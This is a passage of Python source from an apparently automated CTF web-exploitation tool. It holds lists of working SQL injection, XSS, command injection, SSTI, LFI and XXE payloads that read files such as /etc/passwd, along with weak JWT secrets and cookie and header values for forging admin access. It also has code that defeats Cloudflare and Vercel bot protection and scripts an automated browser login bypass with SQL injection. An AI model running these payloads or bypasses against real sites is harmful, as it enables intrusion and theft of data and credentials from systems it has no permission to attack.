                # URL-safe base64
                part = part.replace('-', '+').replace('_', '/')
                return json.loads(base64.b64decode(part).decode('utf-8'))
            
            header = decode_part(parts[0])
            payload = decode_part(parts[1])
            
            return {
                'header': header,
                'payload': payload,
                'signature': parts[2]
            }
        except:
            return None
    
    @classmethod
    def decode_packed_js(cls, code: str) -> Optional[str]:
        """Unpack Dean Edwards packed JavaScript"""
        try:
            # Pattern for packed JS
            pattern = r"eval\(function\(p,a,c,k,e,(?:d|r)\)\{.*?\}\('([^']+)',(\d+),(\d+),'([^']+)'\.split\('\|'\)"
            match = re.search(pattern, code, re.DOTALL)
            
            if not match:
                return None
            
            payload = match.group(1)
            radix = int(match.group(2))
            count = int(match.group(3))
            keywords = match.group(4).split('|')
            
            # Base conversion function
            def base_convert(num, base):
                digits = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
                if num < base:
                    return digits[num]
                return base_convert(num // base, base) + digits[num % base]
            
            # Replace encoded words
            def replacer(match):
                word = match.group(0)
                try:
                    # Convert from base
                    idx = int(word, radix) if radix <= 36 else int(word)
                    return keywords[idx] if idx < len(keywords) and keywords[idx] else word
                except:
                    return word
            
            # Replace all encoded words
            result = re.sub(r'\b\w+\b', replacer, payload)
            return result
        except:
            return None
    
    @classmethod
    def extract_strings_from_binary(cls, data: bytes, min_length: int = 4) -> List[str]:
        """Extract printable strings from binary data"""
        try:
            strings = []
            current = ''
            
            for byte in data:
                if 32 <= byte <= 126:  # Printable ASCII
                    current += chr(byte)
                else:
                    if len(current) >= min_length:
                        strings.append(current)
                    current = ''
            
            if len(current) >= min_length:
                strings.append(current)
            
            return strings
        except:
            return []
    
    @classmethod
    def decode_zlib(cls, data: bytes) -> Optional[str]:
        """Decompress zlib data"""
        try:
            import zlib
            return zlib.decompress(data).decode('utf-8', errors='ignore')
        except:
            return None
    
    @classmethod
    def decode_gzip(cls, data: bytes) -> Optional[str]:
        """Decompress gzip data"""
        try:
            import gzip
            return gzip.decompress(data).decode('utf-8', errors='ignore')
        except:
            return None
    
    @classmethod
    def extract_exif(cls, image_data: bytes) -> Optional[Dict]:
        """Extract EXIF metadata from image"""
        try:
            from PIL import Image
            from PIL.ExifTags import TAGS
            import io
            
            img = Image.open(io.BytesIO(image_data))
            exif_data = img._getexif()
            
            if not exif_data:
                return None
            
            result = {}
            for tag_id, value in exif_data.items():
                tag = TAGS.get(tag_id, tag_id)
                result[tag] = value
            
            return result
        except:
            return None
    
    @classmethod
    def extract_png_chunks(cls, image_data: bytes) -> List[Dict]:
        """Extract chunks from PNG file (may contain hidden data)"""
        try:
            chunks = []
            
            # PNG signature
            if image_data[:8] != b'\x89PNG\r\n\x1a\n':
                return []
            
            pos = 8
            while pos < len(image_data):
                # Read chunk length (4 bytes, big-endian)
                length = struct.unpack('>I', image_data[pos:pos+4])[0]
                pos += 4
                
                # Read chunk type (4 bytes)
                chunk_type = image_data[pos:pos+4].decode('ascii', errors='ignore')
                pos += 4
                
                # Read chunk data
                data = image_data[pos:pos+length]
                pos += length
                
                # Skip CRC (4 bytes)
                pos += 4
                
                chunks.append({
                    'type': chunk_type,
                    'length': length,
                    'data': data
                })
                
                if chunk_type == 'IEND':
                    break
            
            return chunks
        except:
            return []
    
    @classmethod
    def try_all_decodings(cls, text: str, result_log=None) -> List[str]:
        """Try all decoding methods and return successful results"""
        results = []
        
        decoders = [
            ('Base64', cls.decode_base64),
            ('Base32', cls.decode_base32),
            ('Base58', cls.decode_base58),
            ('Base85', cls.decode_base85),
            ('Hex', cls.decode_hex),
            ('Binary', cls.decode_binary),
            ('Octal', cls.decode_octal),
            ('Decimal', cls.decode_decimal),
            ('URL', cls.decode_url),
            ('HTML', cls.decode_html_entities),
            ('ROT13', cls.decode_rot13),
            ('Caesar', cls.decode_caesar),
            ('Atbash', cls.decode_atbash),
            ('Affine', cls.decode_affine),
            ('Morse', cls.decode_morse),
            ('Reverse', cls.decode_reverse),
            ('A1Z26', cls.decode_a1z26),
            ('Phone', cls.decode_phone),
            ('Vigenere', cls.decode_vigenere),
            ('Bacon', cls.decode_bacon),
            ('TapCode', cls.decode_tap_code),
            ('Polybius', cls.decode_polybius),
            ('QuotedPrintable', cls.decode_quoted_printable),
            ('Brainfuck', cls.decode_brainfuck),
        ]
        
        for name, decoder in decoders:
            try:
                decoded = decoder(text)
                if decoded and len(decoded) > 2 and decoded != text:
                    if result_log:
                        result_log(f"Decoded ({name}): {decoded[:50]}...")
                    results.append(decoded)
            except:
                continue
        
        return results


class WebModule(BaseModule):
    """Automated web exploitation with comprehensive attack vectors"""
    
    # SQL Injection payloads
    SQLI_PAYLOADS = {
        'union': [
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "1' UNION SELECT username,password FROM users--",
            "' UNION ALL SELECT NULL,NULL,NULL,NULL--",
        ],
        'boolean': [
            "' OR '1'='1",
            "' OR '1'='1'--",
            "' OR 1=1--",
            "admin' --",
            "' OR ''='",
            "1' OR '1'='1",
        ],
        'time': [
            "'; WAITFOR DELAY '0:0:5'--",
            "' OR SLEEP(5)--",
            "'; SELECT SLEEP(5)--",
            "1' AND SLEEP(5)--",
        ],
        'error': [
            "' AND 1=CONVERT(int,@@version)--",
            "' AND extractvalue(1,concat(0x7e,version()))--",
            "' AND updatexml(1,concat(0x7e,version()),1)--",
        ]
    }
    
    # XSS payloads
    XSS_PAYLOADS = [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '"><script>alert(1)</script>',
        "'-alert(1)-'",
        '<body onload=alert(1)>',
        '<iframe src="javascript:alert(1)">',
        '{{constructor.constructor("alert(1)")()}}',
    ]
    
    # Command injection payloads
    CMD_INJECTION_PAYLOADS = [
        '; cat /flag*',
        '| cat /flag*',
        '`cat /flag*`',
        '$(cat /flag*)',
        '; cat flag.txt',
        '| cat flag.txt',
        '; ls -la',
        '| ls -la',
        '; id',
        '| id',
        '& type flag.txt',
        '| type flag.txt',
        '; cat /etc/passwd',
        '|| cat /flag*',
        '&& cat /flag*',
    ]
    
    # SSTI payloads
    SSTI_PAYLOADS = [
        '{{7*7}}',
        '${7*7}',
        '<%= 7*7 %>',
        '#{7*7}',
        '*{7*7}',
        '{{config}}',
        '{{self.__class__.__mro__[2].__subclasses__()}}',
        "{{''.__class__.__mro__[2].__subclasses__()[40]('/flag.txt').read()}}",
        '{{request.application.__globals__.__builtins__.__import__("os").popen("cat /flag*").read()}}',
    ]
    
    # LFI payloads
    LFI_PAYLOADS = [
        '../flag.txt',
        '../../flag.txt',
        '../../../flag.txt',
        '....//....//flag.txt',
        '..%2f..%2fflag.txt',
        '..%252f..%252fflag.txt',
        '/etc/passwd',
        '....//....//etc/passwd',
        'php://filter/convert.base64-encode/resource=flag.txt',
        'php://filter/convert.base64-encode/resource=index.php',
        'php://input',
        'data://text/plain,<?php system("cat /flag*"); ?>',
        'file:///flag.txt',
        'file:///etc/passwd',
    ]
    
    # XXE payloads
    XXE_PAYLOADS = [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///flag.txt">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    ]
    
    # JWT weak secrets - MASSIVELY EXPANDED
    JWT_WEAK_SECRETS = [
        # Common defaults
        'secret', 'password', '123456', 'admin', 'key', 'private',
        'jwt_secret', 'changeme', 'test', 'development', 'production',
        # More common secrets
        'supersecret', 'mysecret', 'secretkey', 'secret_key', 'jwt-secret',
        'jwt_key', 'jwtkey', 'auth_secret', 'auth_key', 'token_secret',
        'access_secret', 'refresh_secret', 'api_secret', 'api_key',
        # Framework defaults
        'your-256-bit-secret', 'your-secret-key', 'change-me', 'changeit',
        'keyboard cat', 'shhhhh', 'shhhhhared-secret', 'super-secret',
        # Common passwords
        'password123', 'admin123', 'root', 'toor', 'pass', 'pass123',
        'qwerty', 'letmein', 'welcome', 'monkey', 'dragon', 'master',
        # CTF common
        'flag', 'ctf', 'hackme', 'hacked', 'pwned', 'owned', 'r00t',
        # Empty and simple
        '', ' ', 'null', 'none', 'undefined', 'default', 'temp',
        # Numbers
        '1234', '12345', '123456789', '0000', '1111', '9999',
        # Company/tool names
        'flask', 'django', 'express', 'node', 'nodejs', 'react', 'angular',
        'spring', 'laravel', 'rails', 'ruby', 'python', 'java', 'php',
        # Environment
        'dev', 'prod', 'staging', 'local', 'localhost', 'debug',
        # Base64 encoded common secrets
        'c2VjcmV0', 'cGFzc3dvcmQ=', 'YWRtaW4=', 'dGVzdA==',
    ]
    
    # Common header names for injection
    INJECTION_HEADERS = [
        'X-Forwarded-For', 'X-Real-IP', 'X-Originating-IP', 'X-Remote-IP',
        'X-Client-IP', 'X-Host', 'X-Forwarded-Host', 'X-Original-URL',
        'X-Rewrite-URL', 'X-Custom-IP-Authorization', 'X-Forwarded-Server',
        'X-HTTP-Host-Override', 'Forwarded', 'X-Forwarded-Proto',
        'X-Admin', 'X-Role', 'X-Auth', 'X-Authenticated', 'X-User',
        'X-Username', 'X-Access-Level', 'X-Privilege', 'X-Debug', 'X-Test',
        'X-Dev', 'X-Development', 'X-Internal', 'X-Backend', 'X-Proxy',
        'X-Original-Host', 'X-Requested-With', 'X-CSRF-Token', 'X-Api-Key',
        'Authorization', 'X-Authorization', 'X-Auth-Token', 'X-Access-Token',
    ]
    
    # Cookie manipulation values
    COOKIE_ADMIN_VALUES = [
        ('admin', 'true'), ('admin', '1'), ('admin', 'True'), ('admin', 'yes'),
        ('isAdmin', 'true'), ('isAdmin', '1'), ('is_admin', 'true'),
        ('role', 'admin'), ('role', 'administrator'), ('role', 'superuser'),
        ('user', 'admin'), ('username', 'admin'), ('user_role', 'admin'),
        ('auth', 'true'), ('authenticated', 'true'), ('logged_in', 'true'),
        ('session', 'admin'), ('privilege', 'admin'), ('access', 'admin'),
        ('access_level', '999'), ('access_level', 'admin'), ('level', '999'),
        ('permissions', 'admin'), ('is_superuser', 'true'), ('superuser', 'true'),
        ('staff', 'true'), ('is_staff', 'true'), ('moderator', 'true'),
        ('debug', 'true'), ('developer', 'true'), ('internal', 'true'),
    ]
    
    def __init__(self, config):
        super().__init__(config)
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': config.get('modules.web.user_agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
        })
        self.session.verify = config.get('modules.web.verify_ssl', False)
        self.timeout = config.get('modules.web.timeout', 10)  # Reduced default timeout
        self.max_redirects = config.get('modules.web.max_redirects', 10)
        self.quick_mode = False  # Quick mode runs only fast techniques
        
        # Initialize CTF Brain for AI-powered learning
        try:
            from ml.ctf_brain import CTFBrain, SmartBruteforcer
            self.ctf_brain = CTFBrain()
            self.smart_bruteforcer = SmartBruteforcer(self.ctf_brain)
            self.logger.info("CTF Brain initialized successfully")
        except Exception as e:
            self.ctf_brain = None
            self.smart_bruteforcer = None
            self.logger.warning(f"CTF Brain not available: {e}")
    
    def _check_bot_protection(self, url: str, result: ChallengeResult) -> tuple:
        """Check if site has bot protection - quick check only, no bypass attempts"""
        try:
            # Quick check with enhanced headers
            enhanced_headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
            }
            
            response = self.session.get(url, timeout=self.timeout, headers=enhanced_headers)
            
            # Check for common bot protection indicators
            bot_protection_indicators = [
                ('Vercel Security Checkpoint', 'Vercel'),
                ('Just a moment...', 'Cloudflare'),
                ('Checking your browser', 'Cloudflare'),
                ('cf-browser-verification', 'Cloudflare'),
            ]
            
            content_lower = response.text.lower()
            
            for indicator, protection_type in bot_protection_indicators:
                if indicator.lower() in content_lower:
                    result.add_log(f"Detected {protection_type} bot protection")
                    return (False, response.text, response.status_code)
            
            # No bot protection detected - return content
            return (True, response.text, response.status_code)
            
        except Exception as e:
            result.add_log(f"Error checking URL: {e}")
            return (False, "", 0)
    
    def _try_cloudscraper_bypass(self, url: str, result: ChallengeResult) -> str:
        """Try to bypass using cloudscraper (good for Cloudflare)"""
        try:
            import cloudscraper
            
            scraper = cloudscraper.create_scraper(
                browser={
                    'browser': 'chrome',
                    'platform': 'windows',
                    'desktop': True
                }
            )
            
            response = scraper.get(url, timeout=15)
            
            if response.status_code == 200:
                content = response.text
                if 'Vercel Security Checkpoint' not in content and 'Just a moment' not in content:
                    result.add_log("Cloudscraper bypass successful!")
                    return content
            
            return None
            
        except ImportError:
            return None
        except Exception as e:
            return None
    
    def _try_undetected_chrome_bypass(self, url: str, result: ChallengeResult) -> str:
        """Try to bypass using undetected-chromedriver (best for Vercel/Cloudflare)"""
        try:
            import undetected_chromedriver as uc
            import time
            
            result.add_log("Starting undetected Chrome browser...")
            
            options = uc.ChromeOptions()
            options.add_argument('--headless=new')
            options.add_argument('--no-sandbox')
            options.add_argument('--disable-dev-shm-usage')
            options.add_argument('--disable-gpu')
            options.add_argument('--window-size=1920,1080')
            
            driver = uc.Chrome(options=options, use_subprocess=True)
            
            try:
                driver.get(url)
                
                # Wait for protection to clear (Vercel usually takes 3-5 seconds)
                time.sleep(8)
                
                page_source = driver.page_source
                
                # Check if bypass was successful
                if 'Vercel Security Checkpoint' not in page_source and 'Just a moment' not in page_source:
                    result.add_log("Undetected Chrome bypass successful!")
                    
                    # Get all script content
                    try:
                        scripts = driver.find_elements('tag name', 'script')
                        for script in scripts:
                            try:
                                script_content = script.get_attribute('innerHTML')
                                if script_content:
                                    page_source += f"\n<!-- SCRIPT -->\n{script_content}\n"
                            except:
                                pass
                    except:
                        pass
                    
                    return page_source
                else:
                    # Try waiting longer
                    result.add_log("Still on protection page, waiting longer...")
                    time.sleep(10)
                    page_source = driver.page_source
                    
                    if 'Vercel Security Checkpoint' not in page_source:
                        result.add_log("Undetected Chrome bypass successful after extended wait!")
                        return page_source
                    
                    return None
                    
            finally:
                driver.quit()
                
        except ImportError:
            result.add_log("undetected-chromedriver not available - install with: pip install undetected-chromedriver")
            return None
        except Exception as e:
            result.add_log(f"Undetected Chrome error: {e}")
            return None
    
    def _try_selenium_bypass(self, url: str, result: ChallengeResult) -> str:
        """Try to bypass bot protection using Selenium"""
        try:
            from selenium import webdriver
            from selenium.webdriver.chrome.options import Options
            from selenium.webdriver.common.by import By
            import time
            
            result.add_log("Attempting Selenium bypass...")
            
            # Setup Chrome options
            chrome_options = Options()
            chrome_options.add_argument('--headless=new')
            chrome_options.add_argument('--no-sandbox')
            chrome_options.add_argument('--disable-dev-shm-usage')
            chrome_options.add_argument('--disable-gpu')
            chrome_options.add_argument('--window-size=1920,1080')
            chrome_options.add_argument('--disable-blink-features=AutomationControlled')
            chrome_options.add_experimental_option('excludeSwitches', ['enable-automation'])
            chrome_options.add_experimental_option('useAutomationExtension', False)
            chrome_options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36')
            
            driver = webdriver.Chrome(options=chrome_options)
            
            # Remove webdriver flag
            driver.execute_cdp_cmd('Page.addScriptToEvaluateOnNewDocument', {
                'source': '''
                    Object.defineProperty(navigator, 'webdriver', {
                        get: () => undefined
                    })
                '''
            })
            
            try:
                driver.get(url)
                
                # Wait for page to load and bypass protection
                time.sleep(8)
                
                page_source = driver.page_source
                
                # Look for actual content (not protection page)
                if 'Vercel Security Checkpoint' not in page_source and 'Just a moment' not in page_source:
                    result.add_log("Selenium bypass successful!")
                    
                    # Also get any JavaScript-rendered content
                    scripts = driver.find_elements(By.TAG_NAME, 'script')
                    for script in scripts:
                        try:
                            script_content = script.get_attribute('innerHTML')
                            if script_content:
                                page_source += f"\n<!-- SCRIPT -->\n{script_content}\n"
                        except:
                            pass
                    
                    return page_source
                else:
                    result.add_log("Selenium bypass failed - still on protection page")
                    
                    # Try waiting longer
                    time.sleep(10)
                    page_source = driver.page_source
                    
                    if 'Vercel Security Checkpoint' not in page_source:
                        result.add_log("Selenium bypass successful after extended wait!")
                        return page_source
                    
                    return None
                    
            finally:
                driver.quit()
                
        except ImportError:
            result.add_log("Selenium not available - install with: pip install selenium")
            return None
        except Exception as e:
            result.add_log(f"Selenium bypass error: {e}")
            return None
    
    def _try_curl_impersonate_bypass(self, url: str, result: ChallengeResult) -> str:
        """Try to bypass using curl_cffi (curl-impersonate Python binding)"""
        try:
            from curl_cffi import requests as curl_requests
            
            # Impersonate Chrome browser
            response = curl_requests.get(url, impersonate="chrome120", timeout=30)
            
            if response.status_code == 200:
                content = response.text
                if 'Vercel Security Checkpoint' not in content and 'Just a moment' not in content:
                    result.add_log("curl-impersonate bypass successful!")
                    return content
            
            return None
            
        except ImportError:
            result.add_log("curl_cffi not available - install with: pip install curl_cffi")
            return None
        except Exception as e:
            result.add_log(f"curl-impersonate error: {e}")
            return None
    
    def _solve_with_browser(self, url: str, result: ChallengeResult) -> str:
        """Solve challenge using browser automation (for bot-protected sites)"""
        try:
            import undetected_chromedriver as uc
            import time
            
            result.add_log("Using browser automation to solve challenge...")
            
            options = uc.ChromeOptions()
            options.add_argument('--headless=new')
            options.add_argument('--no-sandbox')
            options.add_argument('--disable-dev-shm-usage')
            
            driver = uc.Chrome(options=options, use_subprocess=True)
            
            try:
                driver.get(url)
                time.sleep(8)  # Wait for protection to clear
                
                page_source = driver.page_source
                
                # Check if still on protection page
                if 'Vercel Security Checkpoint' in page_source or 'Just a moment' in page_source:
                    result.add_log("Still on protection page after wait")
                    return None
                
                result.add_log("Bot protection bypassed successfully")
                
                # Check page source for flags
                flag = self.extract_flag(page_source)
                if flag:
                    result.add_log("Found flag in page source")
                    return flag
                
                # Check for hidden JavaScript data
                scripts = driver.find_elements('tag name', 'script')
                for script in scripts:
                    try:
                        script_content = script.get_attribute('innerHTML')
                        if script_content:
                            # Look for encoded data
                            flag = self._extract_js_secrets(script_content, result)
                            if flag:
                                return flag
                            
                            # Check for base64 encoded payloads
                            base64_matches = re.findall(r"['\"]([A-Za-z0-9+/]{4,}={0,2})['\"]", script_content)
                            for b64 in base64_matches:
                                try:
                                    decoded = base64.b64decode(b64).decode('utf-8', errors='ignore')
                                    if decoded and len(decoded) > 2:
                                        result.add_log(f"Found base64: {b64} -> {decoded}")
                                        flag = self.extract_flag(decoded)
                                        if flag:
                                            return flag
                                except:
                                    pass
                    except:
                        pass
                
                # Check for hex-encoded data in page
                hex_matches = re.findall(r'data-hex-\d+="([0-9a-fA-F]+)"', page_source)
                for hex_data in hex_matches:
                    try:
                        decoded = bytes.fromhex(hex_data).decode('utf-8', errors='ignore')
                        if decoded:
                            result.add_log(f"Hex decoded: {decoded}")
                            flag = self.extract_flag(decoded)
                            if flag:
                                return flag
                    except:
                        pass
                
                # Try SQL injection on login forms
                flag = self._browser_sqli_attack(driver, url, result)
                if flag:
                    return flag
                
                # After SQL injection, check for steganography in images
                flag = self._browser_stego_check(driver, url, result)
                if flag:
                    return flag
                
                # Check common paths
                base_url = url.rstrip('/')
                paths_to_check = [
                    '/dashboard', '/dashboard.html', '/admin', '/admin.html',
                    '/flag', '/flag.txt', '/secret', '/secret.html',
                    '/robots.txt', '/sitemap.xml', '/.git/config'
                ]
                
                for path in paths_to_check:
                    try:
                        driver.get(base_url + path)
                        time.sleep(2)
                        page = driver.page_source
                        flag = self.extract_flag(page)
                        if flag:
                            result.add_log(f"Found flag at {path}")
                            return flag
                    except:
                        pass
                
                return None
                
            finally:
                try:
                    driver.quit()
                except:
                    pass
                    
        except ImportError:
            result.add_log("undetected-chromedriver not available")
            return None
        except Exception as e:
            result.add_log(f"Browser automation error: {e}")
            return None
    
    def _browser_stego_check(self, driver, url: str, result: ChallengeResult) -> str:
        """Check for steganography in images using browser to fetch them"""
        try:
            import time
            from PIL import Image
            import io
            
            result.add_log("Checking for steganography in images...")
            
            base_url = url.rstrip('/')
            
            # Common image paths to check
            image_paths = [
                '/inspect.png', '/assets/inspect.png', '/images/inspect.png',
                '/system_backup.png', '/assets/system_backup.png',
                '/flag.png', '/secret.png', '/hidden.png', '/stego.png',
                '/image.png', '/download.png', '/file.png'
            ]
            
            for img_path in image_paths:
                try:
                    img_url = base_url + img_path
                    
                    # Use JavaScript to fetch image and convert to base64
                    img_data = driver.execute_async_script(f'''
                    var callback = arguments[arguments.length - 1];
                    fetch("{img_url}")
                        .then(response => {{
                            if (!response.ok) throw new Error("HTTP " + response.status);
                            return response.blob();
                        }})
                        .then(blob => new Promise((resolve, reject) => {{
                            const reader = new FileReader();
                            reader.onloadend = () => resolve(reader.result);
                            reader.onerror = reject;
                            reader.readAsDataURL(blob);
                        }}))
                        .then(dataUrl => callback(dataUrl))
                        .catch(err => callback("ERROR: " + err.message));
                    ''')
                    
                    if img_data and not img_data.startswith('ERROR') and ',' in img_data:
                        result.add_log(f"Found image: {img_path}")
                        
                        # Extract base64 data
                        b64_data = img_data.split(',')[1]
                        img_bytes = base64.b64decode(b64_data)
                        
                        # Try LSB steganography
                        try:
                            img = Image.open(io.BytesIO(img_bytes))
                            if img.mode not in ('RGB', 'RGBA'):
                                img = img.convert('RGB')
                            
                            pixels = list(img.getdata())
                            
                            # Extract LSB
                            bits = []
                            for pixel in pixels[:100000]:
                                for channel in pixel[:3]:
                                    bits.append(str(channel & 1))
                            
                            bits_str = ''.join(bits)
                            
                            # Convert to text
                            chars = []
                            for i in range(0, len(bits_str) - 8, 8):
                                byte = int(bits_str[i:i+8], 2)
                                if byte == 0:
                                    break
                                if 32 <= byte <= 126:
                                    chars.append(chr(byte))
                            
                            text = ''.join(chars)
                            if text and len(text) > 5:
                                result.add_log(f"LSB steganography found: {text[:100]}")
                                
                                # Check for flag
                                flag = self.extract_flag(text)
                                if flag:
                                    return flag
                                
                                # If no flag format but looks like a message, return it
                                if self._looks_like_english_text(text):
                                    result.add_log(f"Stego message: {text}")
                                    # Some CTFs use the message itself as the flag
                                    if 'congrat' in text.lower() or 'cleared' in text.lower() or 'level' in text.lower():
                                        return text
                        except Exception as e:
                            result.add_log(f"Stego error for {img_path}: {e}")
                except:
                    pass
            
            return None
            
        except Exception as e:
            result.add_log(f"Browser stego check error: {e}")
            return None
    
    def _browser_sqli_attack(self, driver, url: str, result: ChallengeResult) -> str:
        """Perform SQL injection attack using browser automation"""
        try:
            import time
            
            result.add_log("Attempting SQL injection via browser...")
            
            base_url = url.rstrip('/')
            
            # SQL injection payloads
            sqli_payloads = [
                "' OR '1'='1",
                "' OR '1'='1'--",
                "admin'--",
                "' OR 1=1--",
                "admin' OR '1'='1",
            ]
            
            for payload in sqli_payloads:
                try:
                    # Navigate to main page
                    driver.get(url)
                    time.sleep(3)
                    
                    # Find username and password inputs
                    username_input = None
                    password_input = None
                    
                    for selector in ['#username', 'input[name="username"]', 'input[type="text"]', 'input[name="user"]', 'input[name="email"]']:
                        try:
                            username_input = driver.find_element('css selector', selector)
                            if username_input:
                                break
                        except:
                            pass
                    
                    for selector in ['#password', 'input[name="password"]', 'input[type="password"]', 'input[name="pass"]']:
                        try:
                            password_input = driver.find_element('css selector', selector)
                            if password_input:
                                break
                        except:
                            pass
                    
                    if username_input and password_input:
                        # Clear and fill inputs
                        username_input.clear()
                        username_input.send_keys(payload)
                        
                        password_input.clear()
                        password_input.send_keys('anything')
                        
                        # Find and click submit button
                        submit_btn = None
                        for selector in ['button[type="submit"]', 'input[type="submit"]', 'button', '.btn']:
                            try:
                                buttons = driver.find_elements('css selector', selector)
                                for btn in buttons:
                                    btn_text = btn.text.lower()
                                    if any(word in btn_text for word in ['login', 'sign', 'auth', 'submit', 'enter']):
                                        submit_btn = btn
                                        break
                                if submit_btn:
                                    break
                            except:
                                pass
                        
                        if not submit_btn:
                            # Try clicking any button
                            try:
                                submit_btn = driver.find_element('css selector', 'button')
                            except:
                                pass
                        
                        if submit_btn:
                            submit_btn.click()
                            time.sleep(3)
                            
                            # Check for successful login
                            page_source = driver.page_source
                            current_url = driver.current_url
                            
                            # Check if redirected to dashboard
                            if 'dashboard' in current_url.lower() or 'admin' in current_url.lower():
                                result.add_log(f"SQLi successful! Redirected to: {current_url}")
                                flag = self.extract_flag(page_source)
                                if flag:
                                    return flag
                            
                            # Check for success indicators in page
                            success_indicators = ['success', 'welcome', 'authenticated', 'logged in', 'dashboard']
                            if any(ind in page_source.lower() for ind in success_indicators):
                                result.add_log(f"SQLi appears successful with payload: {payload}")
                                
                                # Check current page for flag
                                flag = self.extract_flag(page_source)
                                if flag:
                                    return flag
                                
                                # Try to navigate to dashboard
                                for dash_path in ['/dashboard', '/dashboard.html', '/admin', '/flag', '/flag.txt']:
                                    try:
                                        driver.get(base_url + dash_path)
                                        time.sleep(2)
                                        dash_page = driver.page_source
                                        flag = self.extract_flag(dash_page)
                                        if flag:
                                            result.add_log(f"Found flag at {dash_path}")
                                            return flag
                                    except:
                                        pass
                            
                            # Check for flag in response anyway
                            flag = self.extract_flag(page_source)
                            if flag:
                                return flag
                                
                except Exception as e:
                    result.add_log(f"SQLi attempt error: {e}")
                    continue
            
            return None
            
        except Exception as e:
            result.add_log(f"Browser SQLi error: {e}")
            return None
    
    def solve(self, challenge: Challenge) -> ChallengeResult:
        """Solve web challenge with comprehensive attack vectors"""
        result = self.create_result(challenge, False)
        
        if not challenge.url:
            result.error = "No URL provided"
            return result
        
        result.add_log(f"Testing URL: {challenge.url}")
        
        # Quick check for bot protection
        protection_bypassed, page_content, status_code = self._check_bot_protection(challenge.url, result)
        
        if not protection_bypassed and status_code == 403:
            result.add_log("Site has bot protection - trying browser bypass...")
            
            # Only try browser bypass for protected sites
            try:
                bypassed_content = self._try_undetected_chrome_bypass(challenge.url, result)
                if bypassed_content:
                    protection_bypassed = True
                    page_content = bypassed_content
                    result.add_log("Browser bypass successful!")
            except:
                pass
            
            if not protection_bypassed:
                result.add_log("Could not bypass bot protection")
                result.add_log("Install: pip install undetected-chromedriver")
                result.error = "Bot protection detected - manual solving required"
                return result
            result.add_log("Browser-based solving failed")
            result.add_log("Try: pip install undetected-chromedriver")
            # Continue with regular techniques anyway
        
        # Quick techniques (fast, low-hanging fruit)
        quick_techniques = [
            self._check_source_code,
            self._check_robots_sitemap,
            self._test_common_paths,
            self._test_backup_files,
            self._test_git_exposure,
            self._test_auth_bypass,
            self._check_cookies_localstorage,
            self._check_console_logs,
            # ULTRA ENHANCED ATTACKS
            self._ultra_jwt_attack,
            self._ultra_base64_attack,
            self._ultra_cookie_attack,
            self._ultra_header_attack,
            self._ultra_hidden_url_attack,
        ]
        
        # Full techniques (comprehensive but slower)
        full_techniques = [
            self._check_source_code,
            self._check_robots_sitemap,
            self._check_cookies_localstorage,
            self._check_console_logs,
            self._check_service_workers,
            self._check_source_maps,
            self._check_wasm_modules,
            self._check_graphql_introspection,
            self._check_websocket_messages,
            # ULTRA ENHANCED ATTACKS (Priority)
            self._ultra_jwt_attack,
            self._ultra_base64_attack,
            self._ultra_cookie_attack,
            self._ultra_header_attack,
            self._ultra_hidden_url_attack,
            # Standard attacks
            self._test_sql_injection,
            self._test_command_injection,
            self._test_lfi,
            self._test_ssti,
            self._test_xss,
            self._test_xxe,
            self._test_jwt_attacks,
            self._test_ssrf,
            self._test_auth_bypass,
            self._test_path_traversal,
            self._test_common_paths,
            self._test_backup_files,
            self._test_git_exposure,
            self._test_parameter_pollution,
            self._test_idor,
            self._test_nosql_injection,
            self._test_graphql,
            self._test_websocket,
            self._test_cors,
            self._test_host_header,
            self._test_cache_poisoning,
            self._test_prototype_pollution,
            self._test_open_redirect,
            self._test_crlf_injection,
            self._test_race_condition,
            self._test_deserialization,
            self._test_subdomain_takeover,
            self._test_http_smuggling,
            self._test_web_cache_deception,
            # Advanced attacks
            self._test_header_injection,
            self._test_api_fuzzing,
            self._test_encoding_chains,
            self._test_race_conditions,
            self._test_prototype_pollution,
            self._test_mass_assignment,
            self._test_nosql_injection,
            self._test_deserialization,
        ]
        
        techniques = quick_techniques if self.quick_mode else full_techniques
        
        start_time = time.time()
        patterns_found = []
        
        for technique in techniques:
            try:
                flag = technique(challenge.url, result)
                if flag:
                    result.success = True
                    result.flag = flag
                    result.method = technique.__name__
                    
                    # Learn from successful solve using CTF Brain
                    if self.ctf_brain:
                        solve_time = time.time() - start_time
                        try:
                            self.ctf_brain.learn_from_solution(
                                url=challenge.url,
                                flag=flag,
                                method=technique.__name__,
                                patterns=patterns_found,
                                solve_time=solve_time
                            )
                            result.add_log(f"CTF Brain learned from this challenge")
                        except Exception as e:
                            result.add_log(f"CTF Brain learning error: {e}")
                    
                    return result
            except Exception as e:
                result.add_log(f"Error in {technique.__name__}: {e}")
        
        # FALLBACK: Use CTF Brain AI to solve complex challenges
        if self.ctf_brain:
            result.add_log("Standard techniques failed - CTF Brain taking over...")
            flag = self._ctf_brain_solve(challenge.url, result)
            if flag:
                result.success = True
                result.flag = flag
                result.method = "ctf_brain_ai"
                
                solve_time = time.time() - start_time
                try:
                    self.ctf_brain.learn_from_solution(
                        url=challenge.url,
                        flag=flag,
                        method="ctf_brain_ai",
                        patterns=patterns_found,
                        solve_time=solve_time
                    )
                    result.add_log(f"CTF Brain solved and learned from this challenge")
                except:
                    pass
                
                return result
        
        result.error = "No vulnerabilities found"
        return result
    
    def _ctf_brain_solve(self, url: str, result: ChallengeResult) -> str:
        """Use CTF Brain AI to solve complex challenges that standard techniques couldn't solve"""
        result.add_log("CTF Brain AI analyzing challenge...")
        
